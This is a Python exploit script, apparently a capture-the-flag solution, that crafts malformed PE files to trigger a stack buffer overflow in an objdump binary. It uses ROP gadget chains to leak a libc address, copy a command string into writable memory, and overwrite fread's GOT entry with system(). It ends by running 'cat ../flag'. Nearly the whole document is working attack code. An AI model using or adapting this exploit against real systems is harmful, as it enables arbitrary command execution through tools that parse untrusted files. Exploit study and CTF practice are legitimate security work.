#coding: utf-8
# import sys
# sys.path.append('/media/sf_F_DRIVE/Research/lib')
from Mix import *

context.clear(arch='amd64')

e = MyELF("./objdump")

writable = 0x008283A0 # .data

strcpy = e.symbols["strcpy"]
memcpy = e.symbols["memcpy"]
puts = e.symbols["puts"]
fread = e.symbols["fread"]
mExit = e.symbols["exit"]
printf = e.symbols["printf"]

ret = e.searchAsm("ret").next()
popRdi = e.searchAsm("pop rdi; ret").next()
popRsi = e.searchAsm("pop rsi ; pop rbp ; ret").next() # modify rbp
popRdx = e.searchAsm("pop rdx ; stc  ; cmp eax, 0xC9900000 ; ret  ;").next() # modify eflags
popRax = e.searchAsm("pop rax ; pop rbp ; ret  ;").next() # modify rbp
popRbp = e.searchAsm("pop rbp ; ret  ;").next()
movRsi = e.searchAsm("mov rsi, QWORD PTR [rbp-0x60] ; mov rcx, QWORD PTR [rbp-0x58] ; mov rdi, rcx ; call rax ;").next()
leave = e.searchAsm("leave  ; ret  ;").next()
br = e.searchAsm("int 3").next()

fmtLLX = e.search("%llx\x00").next()

def replaceData(src, offset, value):
    assert offset + len(value) < len(src)
    return src[:offset] + value + src[offset+len(value):]

# leak to have the version of libc
# can leak: free, fread, memset, __libc_start_main, malloc
# use printf("%llx",...) to leak data
def leak():
    data = open('samplePE', 'rb').read()
    rop = ''
    rop += p32(popRax)
    rop += p32(popRbp) # => rax = popRbp
    rop += p32(e.got["fread"]+0x60) # => rbp -> fread GOT+0x60
    rop += p32(movRsi) # => rsi = [fread GOT]
    rop += p32(popRdi)
    rop += p32(fmtLLX)
    rop += p32(popRax)
    rop += p32(0x100) # set al = 0x00 before call printf
    rop += "AAAA"
    rop += p32(printf)
    rop += p32(mExit)
    rop += "AAAA"
    payload = "AAAABBBB"*0xAD+rop
    # log.info(len(payload))
    nRva = len(payload)/8
    # set nRva
    data = replaceData(data, 0xF4, p32(nRva))
    # set SizeOfOptionalHeader
    data = replaceData(data, 0x94, p32(96+nRva*8))
    # set data of DataDirectory
    data = replaceData(data, 0xF8, payload)
    open("stackbof_objdump_leak", "wb").write(data)

'''
rop memcpy(dst, src, len): (RDI, RSI, RDX, RCX, R8, R9)
    + pop rdi # dst
    + dst
    + pop rsi # src
    + src
    + pop rdx # len
    + len
    + memcpy@plt
'''
def createRopMemCpy32(dstAddr, srcValue):
    try:
        return p32(popRdi)+p32(dstAddr)+p32(popRsi)+p32(e.search(srcValue).next())+"AAAA"+p32(popRdx)+p32(len(srcValue))+p32(memcpy)
    except StopIteration:   
        return None
        
'''
rop strcpy (dst, src): (RDI, RSI, RDX, RCX, R8, R9)
    + pop rdi # dst
    + dst
    + pop rsi # src
    + src
    + strcpy@plt
'''
def createRopStrCpy32(dstAddr, srcValue): # would modify rbp
    assert '\x00' not in srcValue[:-1] # cannot copy string with '\x00'
    try:
        return p32(popRdi)+p32(dstAddr)+p32(popRsi)+p32(e.search(srcValue).next())+"AAAA"+p32(strcpy)
    except StopIteration:   
        return None

# lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
lib = ELF("/libc-database/db/libc6_2.23-0ubuntu4_amd64.so")
libFread = lib.symbols["fread"]
libSystem = lib.symbols["system"]
ropAdd = e.searchAsm("add    DWORD PTR [rax-0x360bba75],edx; ret  ;").next()

def exploit(argument):
    # example: argument = "cat ../flag\x00"
    # build a rop to copy argument onto writable
    # not care about performance. Build shortest rop available
    rop = ''
    start = 0
    end = len(argument)
    while start != len(argument):
        if '\x00' not in argument[start:end-1]:
            nextRop = createRopStrCpy32(writable+start, argument[start:end])
        else:
            nextRop = createRopMemCpy32(writable+start, argument[start:end])
        if nextRop == None:
            end -= 1
            if start == end:
                print "Error: cannot create rop"
                exit(1)
            continue
        print "Copy from [%d:%d): %s" % (start, end, [argument[start:end]])
        rop += nextRop
        start = end
        end = len(argument)
    # modify got["fread"] to got["system"]
    rop += p32(popRax)
    rop += p32(e.got["fread"] + 0x360BBA75)
    rop += "AAAA"
    rop += p32(popRdx)
    rop += p32((0xffffffff^(libFread-libSystem))+1)
    rop += p32(ropAdd)
    rop += p32(popRdi)
    rop += p32(writable) # address of argument
    rop += p32(fread)
    rop += p32(mExit)
    payload = "AAAABBBB"*0xAD+rop
    #padding because of 8B-size DATA_DIRECTORY_IMAGE on file
    if len(rop) % 8 == 4:
        rop += 'AAAA'
    data = open('samplePE', 'rb').read()

    nRva = len(payload)/8
    # set nRva
    data = replaceData(data, 0xF4, p32(nRva))
    # set SizeOfOptionalHeader
    data = replaceData(data, 0x94, p32(96+nRva*8))
    # set data of DataDirectory
    data = replaceData(data, 0xF8, payload)

    open('stackbof_objdump_exploit', 'wb').write(data)

# leak() # => fread = 7f675984c1a0 => /libc-database/db/libc6_2.23-0ubuntu4_amd64.so
exploit("cat ../flag\x00")
